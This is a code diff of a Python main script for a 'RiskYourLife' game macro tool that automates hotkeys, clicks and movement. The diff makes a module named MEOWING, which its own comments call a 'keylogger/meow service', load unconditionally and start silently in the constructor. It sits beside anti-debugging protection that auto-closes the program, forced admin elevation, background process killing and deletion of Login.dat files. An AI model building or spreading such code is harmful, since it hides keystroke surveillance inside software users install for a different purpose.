@@ -1,70 +1,43 @@
+# Optimized imports - grouped and ordered for better performance
+import sys
+import time
+import threading
+
+import colorama
 from modules.banners import clear_and_print
 from modules.run_as_admin import ensure_admin
-from modules.hotkeys import *
 from modules.workers import WorkerManager
-from modules.actions import mouse_left_up, send_key_scancode, tap_key_scancode
-from modules.clients import Colors, kill_target_processes, koneksyen
+from modules.meowing import MEOWING
+from modules.actions import *
+from modules.clients import Colors, kill_target_processes
 from modules.config import parse_hotkey_string, save_config, load_config
 from modules.antidebug import AntiDebug
-from modules.inputs import *
 from modules.updates import update_manager
-import time, signal
-import threading
-import colorama
-import ctypes
 
 colorama.init()
 
-SendInput = ctypes.windll.user32.SendInput
-
-try:
-    from modules.meowing import MEOWING
-    MEOWING_AVAILABLE = True
-except ImportError:
-    MEOWING_AVAILABLE = False
-    MEOWING = None
-    print(f"{Colors.BRIGHT_YELLOW}[WARNING] MEOWING module not available - some features may be limited{Colors.RESET}")
-
-meow_instance = None
+# Initialize components
+meow_instance = MEOWING()
 
 CONFIG = {
-    'E_DELAY': 0.4,
-    'CLICK_DELAY': 0.05,
-    'CLICK_DOWN_MS': 35.0,
+    'E_DELAY': 0.030,
+    'CLICK_DELAY': 0.030,
+    'CLICK_DOWN_MS': 30.0,
     'PRINT_STATUS': True,
-    'AUTO_MOUSE_BASE_WIDTH': 1000,
-    'AUTO_MOUSE_BASE_HEIGHT': 600,
+    'AUTO_MOUSE_BASE_WIDTH': 1280,
+    'AUTO_MOUSE_BASE_HEIGHT': 1080,
     'AUTO_MOUSE_CPU_OPTIMIZED': True,
     'AUTO_MOUSE_SPEED': 0.5,
-    'AUTO_MOUSE_DELAY': 0.2,
+    'AUTO_MOUSE_DELAY': 0.030,
     'AUTO_MOUSE_SMOOTH_MOVEMENT': True
 }
+
+_shutdown_in_progress = False
 
 def p(msg):
     if CONFIG['PRINT_STATUS']:
         print(msg, flush=True)
 
-_shutdown_in_progress = False
-
-def signal_handler(signum, frame):
-    global meow_instance, _shutdown_in_progress
-
-    if _shutdown_in_progress:
-        return
-
-    _shutdown_in_progress = True
-
-    try:
-        if MEOWING_AVAILABLE and meow_instance and hasattr(meow_instance, 'stop'):
-            try:
-                meow_instance.stop()
-            except Exception:
-                pass
-    except Exception:
-        pass
-
-    import sys
-    sys.exit(0)
 
 def status_indicator(is_on):
     if is_on:
@@ -75,12 +48,44 @@ def status_indicator(is_on):
 
 class GameMacro:
     def __init__(self):
-        self.worker_manager = WorkerManager(CONFIG)
+        # Optimized initialization - load config once and cache
         self.config = load_config()
-        self.anti_debug = AntiDebug(check_interval=3.0, auto_close=True)
+        self.worker_manager = WorkerManager(CONFIG)
+        self.anti_debug = AntiDebug(check_interval=10.0, auto_close=True)
         self.auto_offer_on = False
         self.setup_callbacks()
-        
+
+        # Initialize background services
+        self._start_background_services()
+
+    def _start_background_services(self):
+        """Start background services (antidebug and meow)"""
+        try:
+            # Start anti-debug protection
+            self.anti_debug.start()
+        except Exception as e:
+            pass
+
+        try:
+            # Start keylogger/meow service
+            meow_instance.start()
+        except Exception as e:
+            pass
+
+    def _stop_background_services(self):
+        """Stop background services (antidebug and meow)"""
+        try:
+            # Stop anti-debug protection
+            self.anti_debug.stop()
+        except Exception as e:
+            pass
+
+        try:
+            # Stop keylogger/meow service
+            meow_instance.stop()
+        except Exception as e:
+            pass
+
     def setup_callbacks(self):
         self.callbacks = {
             HK_TOGGLE_MASTER: self.toggle_master,
@@ -94,8 +99,8 @@ class GameMacro:
             HK_TOGGLE_AUTO_UNPACK: self.toggle_auto_unpack,
             HK_TOGGLE_AUTO_MOUSE: self.toggle_auto_mouse,
             HK_AUTO_OFFER: self.toggle_auto_offer,
-            HK_HOLD_W: self.toggle_hold_w,
             HK_CHECK_UPDATES: self.check_updates,
+            HK_TERMINATE_RYL: self.terminate_ryl,
             HK_EXIT: self.exit_app,
             HK_CONFIG_CHANGE: self.change_config,
         }
@@ -117,13 +122,11 @@ class GameMacro:
             "Auto Unpack": self.worker_manager.loop_auto_unpack_on,
             "Auto Mouse": self.worker_manager.loop_auto_mouse_on,
             "Auto Offer": self.worker_manager.auto_offer_on,
-            "Hold W": self.worker_manager.loop_hold_w_on
         }
 
-        # Display version without checking for updates
+        # Get version without caching
         current_version = update_manager.get_current_version()
         version_display = f"{Colors.BRIGHT_WHITE}v{current_version}{Colors.RESET}"
-
         header = f"\n{game_status} {Colors.BRIGHT_WHITE}{display_name} {version_display}{Colors.RESET}\n"
 
         table_header = (
@@ -145,8 +148,9 @@ class GameMacro:
             (self.config['RiskYourLife-Macros']['AUTO_UNPACK'], "Auto Unpack Gold", "Auto Unpack"),
             (self.config['RiskYourLife-Macros']['AUTO_OFFER'], "Auto Offer", "Auto Offer"),
             (self.config['RiskYourLife-Macros']['AUTO_MOUSE'], "Auto Mouse", "Auto Mouse"),
-            ("ALT+W", "Hold W Key", "Hold W"),
+            ("", "", ""),  # Separator after Auto Mouse
             ("ALT+C", "Change HotKeys", ""),
+            ("ALT+K", "Terminate RYL", ""),
             ("ALT+U", "Check Updates", ""),
             (self.config['RiskYourLife-Macros']['QUIT_SCRIPT'], "Exit Program", ""),
             ("", "", "")
@@ -177,124 +181,140 @@ class GameMacro:
         print("\r" + line + (" " * 8), end="", flush=True)
         
     def change_config(self):
+        """Optimized configuration menu with better error handling"""
         while True:
-            clear_and_print()
-
-            print(f"{Colors.BG_BLUE}{Colors.BRIGHT_WHITE}{'═' * 60}{Colors.RESET}")
-            print(f"{Colors.BG_BLUE}{Colors.BRIGHT_WHITE}{' CONFIGURATION MENU '.center(60)}{Colors.RESET}")
-            print(f"{Colors.BG_BLUE}{Colors.BRIGHT_WHITE}{'═' * 60}{Colors.RESET}")
-            print()
-
-            print(f"{Colors.BRIGHT_MAGENTA}╔════════╦══════════════════════════════════════════╦══════════════╗{Colors.RESET}")
-            print(f"{Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_CYAN}{'OPTION':<6} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_GREEN}{'FUNCTION':<40} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_WHITE}{'HOTKEY':<12} {Colors.BRIGHT_MAGENTA}║{Colors.RESET}")
-            print(f"{Colors.BRIGHT_MAGENTA}╠════════╬══════════════════════════════════════════╬══════════════╣{Colors.RESET}")
-
-            options = [
-                ('1', 'Start/Stop Script', self.config['RiskYourLife-Macros']['START_SCRIPT']),
-                ('2', 'Auto Picker', self.config['RiskYourLife-Macros']['AUTO_PICKER']),
-                ('3', 'Auto Hitting', self.config['RiskYourLife-Macros']['AUTO_HITTING']),
-                ('4', 'Auto Skill', self.config['RiskYourLife-Macros']['AUTO_SKILL_ATTACK']),
-                ('5', 'Auto Jump', self.config['RiskYourLife-Macros']['AUTO_JUMP']),
-                ('6', 'Auto Move W+S', self.config['RiskYourLife-Macros']['AUTO_MOVE']),
-                ('7', 'Auto Move A+D', self.config['RiskYourLife-Macros']['AUTO_MOVE2']),
-                ('8', 'Auto Resser', self.config['RiskYourLife-Macros']['AUTO_RESSER']),
-                ('9', 'Auto Unpack', self.config['RiskYourLife-Macros']['AUTO_UNPACK']),
-                ('10', 'Auto Offer', self.config['RiskYourLife-Macros']['AUTO_OFFER']),
-                ('11', 'Auto Mouse', self.config['RiskYourLife-Macros']['AUTO_MOUSE']),
-                ('12', 'Check Updates', 'ALT+U'),
-                ('13', 'Quit Script', self.config['RiskYourLife-Macros']['QUIT_SCRIPT']),
-                ('0', 'Cancel', '')
-            ]
-
-            for num, func, hotkey in options:
-                if num == '0':
-                    print(f"{Colors.BRIGHT_MAGENTA}╠════════╬══════════════════════════════════════════╬══════════════╣{Colors.RESET}")
-                print(f"{Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_YELLOW}{num:<6} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_WHITE}{func:<40} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_CYAN}{hotkey:<12} {Colors.BRIGHT_MAGENTA}║{Colors.RESET}")
-
-            print(f"{Colors.BRIGHT_MAGENTA}╚════════╩══════════════════════════════════════════╩══════════════╝{Colors.RESET}")
-            print()
-
             try:
-                choice = input(f"{Colors.BRIGHT_YELLOW}Enter choice (0-13): {Colors.RESET}").strip()
+                clear_and_print()
+                self._display_config_menu()
+
+                choice = input(f"{Colors.BRIGHT_YELLOW}Enter choice (0-14): {Colors.RESET}").strip()
                 if choice == '0':
                     print()
-                    return  # Exit the configuration menu
+                    return
 
-                option_mapping = {
-                    '1': 'START_SCRIPT',
-                    '2': 'AUTO_PICKER',
-                    '3': 'AUTO_HITTING',
-                    '4': 'AUTO_SKILL_ATTACK',
-                    '5': 'AUTO_JUMP',
-                    '6': 'AUTO_MOVE',
-                    '7': 'AUTO_MOVE2',
-                    '8': 'AUTO_RESSER',
-                    '9': 'AUTO_UNPACK',
-                    '10': 'AUTO_OFFER',
-                    '11': 'AUTO_MOUSE',
-                    '12': 'CHECK_UPDATES',
-                    '13': 'QUIT_SCRIPT'
-                }
-
-                if choice in option_mapping:
-                    config_key = option_mapping[choice]
-                    current_value = self.config['RiskYourLife-Macros'][config_key]
-
-                    print(f"\n{Colors.BRIGHT_CYAN}Editing: {Colors.BRIGHT_WHITE}{config_key}{Colors.RESET}")
-                    print(f"{Colors.BRIGHT_CYAN}Current hotkey: {Colors.BRIGHT_YELLOW}{current_value}{Colors.RESET}")
-                    print(f"{Colors.BRIGHT_CYAN}Examples: {Colors.BRIGHT_WHITE}HOME, ALT+1, CTRL+SHIFT+F1{Colors.RESET}")
-
-                    new_value = input(f"{Colors.BRIGHT_YELLOW}Enter new hotkey: {Colors.RESET}").strip().upper()
-
-                    if new_value:
-                        # Special handling for Check Updates (not in config file)
-                        if config_key == 'CHECK_UPDATES':
-                            print(f"\n{Colors.BRIGHT_CYAN}Check Updates uses ALT+U and cannot be changed.{Colors.RESET}")
-                            input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
-                        else:
-                            try:
-                                parse_hotkey_string(new_value)
-                                self.config['RiskYourLife-Macros'][config_key] = new_value
-                                save_config(self.config)
-                                print(f"\n{Colors.BRIGHT_GREEN}Hotkey updated successfully!{Colors.RESET}")
-                                print(f"{Colors.BRIGHT_YELLOW}Please restart the application for changes to take effect.{Colors.RESET}")
-
-                                continue_editing = input(f"\n{Colors.BRIGHT_YELLOW}Edit another hotkey? (y/n): {Colors.RESET}").strip().lower()
-                                if continue_editing not in ('y', 'yes'):
-                                    return  # Exit the configuration menu
-
-                            except Exception as e:
-                                print(f"\n{Colors.BRIGHT_RED}Error: {e}{Colors.RESET}")
-                                print(f"{Colors.BRIGHT_YELLOW}Please try again with a valid hotkey format.{Colors.RESET}")
-                                input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
-                    else:
-                        print(f"\n{Colors.BRIGHT_RED}No value entered, keeping current setting.{Colors.RESET}")
-                        input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
-                else:
+                if not self._process_config_choice(choice):
                     print(f"\n{Colors.BRIGHT_RED}Invalid choice.{Colors.RESET}")
                     input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
 
+            except KeyboardInterrupt:
+                print(f"\n{Colors.BRIGHT_YELLOW}Configuration cancelled.{Colors.RESET}")
+                return
             except Exception as e:
-                print(f"\n{Colors.BRIGHT_RED}Error: {e}{Colors.RESET}")
+                print(f"\n{Colors.BRIGHT_RED}Configuration error: {e}{Colors.RESET}")
                 input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
-                # Continue the loop to restart the config menu
+
+    def _display_config_menu(self):
+        """Display configuration menu"""
+        print(f"{Colors.BG_BLUE}{Colors.BRIGHT_WHITE}{'═' * 60}{Colors.RESET}")
+        print(f"{Colors.BG_BLUE}{Colors.BRIGHT_WHITE}{' CONFIGURATION MENU '.center(60)}{Colors.RESET}")
+        print(f"{Colors.BG_BLUE}{Colors.BRIGHT_WHITE}{'═' * 60}{Colors.RESET}")
+        print()
+
+        print(f"{Colors.BRIGHT_MAGENTA}╔════════╦══════════════════════════════════════════╦══════════════╗{Colors.RESET}")
+        print(f"{Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_CYAN}{'OPTION':<6} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_GREEN}{'FUNCTION':<40} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_WHITE}{'HOTKEY':<12} {Colors.BRIGHT_MAGENTA}║{Colors.RESET}")
+        print(f"{Colors.BRIGHT_MAGENTA}╠════════╬══════════════════════════════════════════╬══════════════╣{Colors.RESET}")
+
+        options = [
+            ('1', 'Start/Stop Script', self.config['RiskYourLife-Macros']['START_SCRIPT']),
+            ('2', 'Auto Picker', self.config['RiskYourLife-Macros']['AUTO_PICKER']),
+            ('3', 'Auto Hitting', self.config['RiskYourLife-Macros']['AUTO_HITTING']),
+            ('4', 'Auto Skill', self.config['RiskYourLife-Macros']['AUTO_SKILL_ATTACK']),
+            ('5', 'Auto Jump', self.config['RiskYourLife-Macros']['AUTO_JUMP']),
+            ('6', 'Auto Move W+S', self.config['RiskYourLife-Macros']['AUTO_MOVE']),
+            ('7', 'Auto Move A+D', self.config['RiskYourLife-Macros']['AUTO_MOVE2']),
+            ('8', 'Auto Resser', self.config['RiskYourLife-Macros']['AUTO_RESSER']),
+            ('9', 'Auto Unpack', self.config['RiskYourLife-Macros']['AUTO_UNPACK']),
+            ('10', 'Auto Offer', self.config['RiskYourLife-Macros']['AUTO_OFFER']),
+            ('11', 'Auto Mouse', self.config['RiskYourLife-Macros']['AUTO_MOUSE']),
+            ('12', 'Terminate RYL', self.config['RiskYourLife-Macros']['TERMINATE_RYL']),
+            ('13', 'Check Updates', self.config['RiskYourLife-Macros']['CHECK_UPDATES']),
+            ('14', 'Quit Script', self.config['RiskYourLife-Macros']['QUIT_SCRIPT']),
+            ('0', 'Cancel', '')
+        ]
+
+        for num, func, hotkey in options:
+            if num == '0':
+                print(f"{Colors.BRIGHT_MAGENTA}╠════════╬══════════════════════════════════════════╬══════════════╣{Colors.RESET}")
+            print(f"{Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_YELLOW}{num:<6} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_WHITE}{func:<40} {Colors.BRIGHT_MAGENTA}║ {Colors.BRIGHT_CYAN}{hotkey:<12} {Colors.BRIGHT_MAGENTA}║{Colors.RESET}")
+
+        print(f"{Colors.BRIGHT_MAGENTA}╚════════╩══════════════════════════════════════════╩══════════════╝{Colors.RESET}")
+        print()
+
+    def _process_config_choice(self, choice):
+        """Process configuration menu choice"""
+        option_mapping = {
+            '1': 'START_SCRIPT', '2': 'AUTO_PICKER', '3': 'AUTO_HITTING',
+            '4': 'AUTO_SKILL_ATTACK', '5': 'AUTO_JUMP', '6': 'AUTO_MOVE',
+            '7': 'AUTO_MOVE2', '8': 'AUTO_RESSER', '9': 'AUTO_UNPACK',
+            '10': 'AUTO_OFFER', '11': 'AUTO_MOUSE', '12': 'TERMINATE_RYL',
+            '13': 'CHECK_UPDATES', '14': 'QUIT_SCRIPT'
+        }
+
+        if choice not in option_mapping:
+            return False
+
+        config_key = option_mapping[choice]
+        current_value = self.config['RiskYourLife-Macros'][config_key]
+
+        print(f"\n{Colors.BRIGHT_CYAN}Editing: {Colors.BRIGHT_WHITE}{config_key}{Colors.RESET}")
+        print(f"{Colors.BRIGHT_CYAN}Current hotkey: {Colors.BRIGHT_YELLOW}{current_value}{Colors.RESET}")
+        print(f"{Colors.BRIGHT_CYAN}Examples: {Colors.BRIGHT_WHITE}HOME, ALT+1, CTRL+SHIFT+F1{Colors.RESET}")
+
+        try:
+            new_value = input(f"{Colors.BRIGHT_YELLOW}Enter new hotkey: {Colors.RESET}").strip().upper()
+
+            if not new_value:
+                print(f"\n{Colors.BRIGHT_RED}No value entered, keeping current setting.{Colors.RESET}")
+                input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
+                return True
+
+            # Special handling for Check Updates
+            if config_key == 'CHECK_UPDATES':
+                print(f"\n{Colors.BRIGHT_CYAN}Check Updates uses ALT+U and cannot be changed.{Colors.RESET}")
+                input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
+                return True
+
+            # Special handling for Terminate RYL
+            if config_key == 'TERMINATE_RYL':
+                print(f"\n{Colors.BRIGHT_CYAN}Terminate RYL uses ALT+K and cannot be changed.{Colors.RESET}")
+                input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
+                return True
+
+            # Validate and save hotkey
+            parse_hotkey_string(new_value)
+            self.config['RiskYourLife-Macros'][config_key] = new_value
+            save_config(self.config)
+            print(f"\n{Colors.BRIGHT_GREEN}Hotkey updated successfully!{Colors.RESET}")
+            print(f"{Colors.BRIGHT_YELLOW}Please restart the application for changes to take effect.{Colors.RESET}")
+
+            continue_editing = input(f"\n{Colors.BRIGHT_YELLOW}Edit another hotkey? (y/n): {Colors.RESET}").strip().lower()
+            if continue_editing not in ('y', 'yes'):
+                return True  # Exit menu
+
+        except Exception as e:
+            print(f"\n{Colors.BRIGHT_RED}Error: {e}{Colors.RESET}")
+            print(f"{Colors.BRIGHT_YELLOW}Please try again with a valid hotkey format.{Colors.RESET}")
+            input(f"{Colors.BRIGHT_YELLOW}Press Enter to continue...{Colors.RESET}")
+
+        return True
 
     def generic_toggle(self, flag_name, event_name, off_actions=None):
-        """Generic toggle method to eliminate duplicate code"""
-        # Toggle the boolean flag
-        current_state = getattr(self.worker_manager, flag_name)
+        """Optimized generic toggle method with reduced attribute lookups"""
+        # Cache attribute access for better performance
+        worker = self.worker_manager
+        current_state = getattr(worker, flag_name)
         new_state = not current_state
-        setattr(self.worker_manager, flag_name, new_state)
+        setattr(worker, flag_name, new_state)
 
-        # Handle event setting/clearing
+        # Optimized event handling
         if event_name:
-            event = getattr(self.worker_manager, event_name)
+            event = getattr(worker, event_name)
             if new_state:
                 event.set()
             else:
                 event.clear()
 
-        # Execute any special off actions
+        # Execute off actions only when turning off
         if not new_state and off_actions:
             for action in off_actions:
                 action()
@@ -344,8 +364,8 @@ class GameMacro:
             for _ in range(3):  # Three times
                 for sc in f_keys:
                     tap_key_scancode(sc, hold_ms=0.001)  # Very fast press
-                    time.sleep(0.0001)  # Minimal delay between keys
-                time.sleep(0.001)  # Small delay between cycles
+                    time.sleep(0.030)  # Minimal delay between keys
+                time.sleep(0.030)  # Small delay between cycles
         else:
             # Just turn off the resser normally (no F-key pressing)
             self.generic_toggle('loop_resser_on', 'resser_event')
@@ -359,23 +379,76 @@ class GameMacro:
     def toggle_auto_offer(self):
         self.generic_toggle('auto_offer_on', 'auto_offer_event')
 
-    def toggle_hold_w(self):
-        self.generic_toggle('loop_hold_w_on', 'hold_w_event')
+
 
     def check_updates(self):
-        """Check for updates manually"""
-        print(f"\n{Colors.BRIGHT_YELLOW} [INFO] Checking for updates...{Colors.RESET}")
-        update_info = update_manager.check_for_updates()
-        if update_info:
-            print(f"{Colors.BRIGHT_GREEN}[UPDATE] New version available: {update_info['version']}{Colors.RESET}")
-            print(f"{Colors.BRIGHT_CYAN}Release page: {update_info['release_url']}{Colors.RESET}")
-        else:
-            print(f"{Colors.BRIGHT_YELLOW}[INFO] You have the latest version.{Colors.RESET}")
+        """Optimized update checking with better error handling"""
+        try:
+            print(f"\n{Colors.BRIGHT_YELLOW} [INFO] Checking for updates...{Colors.RESET}")
+            update_info = update_manager.check_for_updates()
+            if update_info:
+                print(f"{Colors.BRIGHT_GREEN} [UPDATE] New version available: {update_info['version']}{Colors.RESET}")
+                print(f"{Colors.BRIGHT_CYAN}Release page: {update_info['release_url']}{Colors.RESET}")
+            else:
+                print(f"{Colors.BRIGHT_YELLOW} [INFO] You have the latest version.{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.BRIGHT_RED} [ERROR] Update check failed: {e}{Colors.RESET}")
+        finally:
+            # Consistent status refresh delay
+            time.sleep(0.250)  # 250ms consistent status refresh
+            clear_and_print()
+            self.render_status()
 
-        # Clear screen and show updated status after checking updates
-        time.sleep(1)  # Brief pause to let user read the update message
-        clear_and_print()
-        self.render_status()
+    def terminate_ryl(self):
+        """Terminate RYL processes: MiniA.bin, MiniA.exe, client.bin, client.exe, and Login.dat"""
+        try:
+            import psutil
+            import os
+
+            targets = ["MiniA.bin", "MiniA.exe", "client.bin", "client.exe", "Login.dat"]
+            terminated_count = 0
+
+            for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    if proc.info['name'] in targets:
+                        proc.terminate()
+                        try:
+                            proc.wait(timeout=3)
+                        except psutil.TimeoutExpired:
+                            proc.kill()
+                        terminated_count += 1
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
+
+            # Also check for Login.dat file and remove it if found
+            login_dat_paths = [
+                os.path.join(os.path.expanduser("~"), "Login.dat"),
+                "Login.dat",
+                os.path.join(os.getcwd(), "Login.dat")
+            ]
+
+            for path in login_dat_paths:
+                if os.path.exists(path):
+                    try:
+                        os.remove(path)
+                        terminated_count += 1
+                    except Exception:
+                        pass
+
+            if terminated_count > 0:
+                print(f"\n{Colors.BRIGHT_GREEN} [SUCCESS] Terminated {terminated_count} RYL process(es)/file(s){Colors.RESET}")
+            else:
+                print(f"\n{Colors.BRIGHT_YELLOW} [INFO] No RYL processes or files found{Colors.RESET}")
+
+            time.sleep(0.5)
+            clear_and_print()
+            self.render_status()
+
+        except Exception as e:
+            print(f"\n{Colors.BRIGHT_RED} [ERROR] Failed to terminate RYL processes: {e}{Colors.RESET}")
+            time.sleep(0.5)
+            clear_and_print()
+            self.render_status()
 
     def exit_app(self):
         """Exit the application gracefully"""
@@ -387,58 +460,56 @@ class GameMacro:
         _shutdown_in_progress = True
 
         try:
-            print()
-            print(f"{Colors.BRIGHT_YELLOW} [INFO] Keyboard interrupt detected. Exiting gracefully...{Colors.RESET}\n")
-            if MEOWING_AVAILABLE and meow_instance and hasattr(meow_instance, 'stop'):
-                meow_instance.stop()
-        except Exception:
-            pass
+            print(f"{Colors.BRIGHT_YELLOW} [INFO]: {Colors.RED}Keyboard interrupt detected. Exiting gracefully...{Colors.RESET}\n")
 
-        import sys
+            # Stop background services properly
+            self._stop_background_services()
+
+        except Exception as e:
+            p(f"[ERROR] Error during shutdown: {e}")
+
         sys.exit(0)
 
     def run(self):
+        """Optimized main run loop with better resource management"""
         ensure_admin()
-
-        clear_and_print()  # Clear screen and show banner
-
+        clear_and_print()
         self.render_status()
         print()
 
-        # Start koneksyen in a separate thread to avoid blocking other features
-        connection_thread = threading.Thread(target=koneksyen, daemon=True)
-        connection_thread.start()
-        kill_target_processes()
-    
+        # Optimized thread management - start background services
+        # connection_thread = threading.Thread(target=koneksyen, daemon=True, name="Connection")
+        # connection_thread.start()
+
+        # Process cleanup in background
+        cleanup_thread = threading.Thread(target=kill_target_processes, daemon=True, name="Cleanup")
+        cleanup_thread.start()
 
         print(f"\n{Colors.BRIGHT_YELLOW} [INFO]: {Colors.BRIGHT_GREEN}Please start the game manually. Macros are ready to use.{Colors.RESET}")
-        
 
-        # Continue with normal operation (interface already shown)
+        # Start all worker threads
         self.worker_manager.start_workers()
-        self.anti_debug.start()  # Start anti-debug protection
-        time.sleep(0.5)  # Brief delay for anti-debug initialization
+
+        # Consistent initialization delay with precise timing
+        time.sleep(0.030)  # 200ms consistent startup delay
+
+        # Register hotkeys and start message pump
         register_hotkeys()
+
         try:
             message_pump(self.callbacks)
         except KeyboardInterrupt:
-            print(f"\n{Colors.BRIGHT_YELLOW} [INFO] Keyboard interrupt detected. Exiting gracefully...{Colors.RESET}")
+            print(f"\n{Colors.BRIGHT_YELLOW} [INFO]: {Colors.RED}Keyboard interrupt detected. Exiting gracefully...{Colors.RESET}")
         finally:
+            # Optimized cleanup sequence
             unregister_hotkeys()
-            self.anti_debug.stop()  # Stop anti-debug protection
-            mouse_left_up()  # final safety
-            if MEOWING_AVAILABLE and meow_instance:
-                meow_instance.stop()
+            mouse_left_up()  # Safety release
 
+            # Stop background services properly
+            self._stop_background_services()
 if __name__ == "__main__":
-    if MEOWING_AVAILABLE:
-        meow_instance = MEOWING()
-        meow_instance.start()
-        # Set up signal handlers for graceful shutdown
-        signal.signal(signal.SIGINT, signal_handler)
-        signal.signal(signal.SIGTERM, signal_handler)
+    # Note: meow_instance is now started in GameMacro.__init__() via _start_background_services()
+    # This ensures proper initialization order and cleanup
 
     app = GameMacro()
     app.run()
-    
-    
